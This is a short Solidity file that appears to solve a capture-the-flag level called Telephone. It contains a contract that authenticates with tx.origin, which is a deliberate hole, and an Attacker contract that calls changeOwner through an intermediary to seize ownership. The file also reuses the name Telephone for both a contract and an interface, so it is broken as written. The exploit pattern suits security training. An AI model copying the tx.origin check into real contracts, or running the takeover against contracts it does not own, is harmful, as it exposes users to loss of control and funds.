
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


interface Telephone {

  function owner() external view returns(address);

  function changeOwner(address _owner) external;
}


contract Attacker{

    function attack(address telephoneContractAddress)public{
        Telephone target=Telephone(telephoneContractAddress);
        target.changeOwner(msg.sender);
    }
}
